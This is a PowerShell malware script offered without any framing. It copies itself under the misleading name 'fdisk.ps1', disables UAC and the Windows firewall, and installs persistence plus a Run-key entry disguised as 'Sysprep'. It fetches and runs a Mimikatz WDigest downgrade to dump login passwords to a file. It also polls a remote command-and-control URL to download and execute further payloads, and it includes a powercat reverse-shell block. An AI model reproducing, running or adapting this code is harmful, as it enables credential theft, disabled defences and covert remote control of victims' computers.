# add powershell root path to env path
$Env:path=$Env:Path+";C:\Windows\System32\WindowsPowerShell\v1.0\"  

# copy self to temp path
cp $MyInvocation.MyCommand.Path "$env:temp\fdisk.ps1"

# copy self to powershell root path
cp $MyInvocation.MyCommand.Path "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"


if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {

	# turn of the LUA and firewall
	New-ItemProperty -Path "HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System" -Name EnableLUA -PropertyType DWORD -Value 0x00000000 -Force
	netsh advfirewall set allprofiles state off

	# add persistence
	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Add-Persistence.ps1')
	Add-Persistence -ScriptPath "C:\Windows\System32\WindowsPowerShell\v1.0\1.ps1"

	# auto-run
	New-ItemProperty -Path "HKLM:/SOFTWARE/Microsoft/Windows/CurrentVersion/run" -Name Sysprep -PropertyType String -Value  `
    'powershell -NoP -NonI -W Hidden -c "Start-Process C:\Windows\System32\Sysprep\sysprep.exe -WindowStyle Hidden"' -Force

	# dump login user password
	$strFileName="c:\windows\zaccount.log"
	If (Test-Path $strFileName){
		# // File exists
	
	}Else{
		# // File does not exist
		IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1')
		Invoke-MimikatzWDigestDowngrade
		Get-Job | Receive-Job | Out-File $strFileName
	}

	# reverse shell Start-Process -ArgumentList -c
    $server = 'http://1.nekocode.sinaapp.com/bd'

    While(1) {
        Try {
            $info = Invoke-RestMethod -Method Get -Uri $server
            $strPowercat = (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
            
            if($info.url -eq "") {
            } else {
                Import-Module BitsTransfer
                Start-BitsTransfer $info.url ("$env:temp\"+$info.filename)

                try {
                    invoke-item ("$env:temp\"+$info.filename)
                } Catch {
                }
            }
            Break
        } Catch {
        }

        Start-Sleep -Seconds 3
    }

    While(0){
        Try {
            start-job -ArgumentList $info,$strPowercat {
                param($info,$strPowercat)
                IEX $strPowercat
                powercat -c $info.host -p $info.port -ep
            }
            get-job | wait-job
        } Catch {
        }

        Start-Sleep -Seconds 3
    }
    
	
} else {
	powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File $env:temp\fdisk.ps1
}
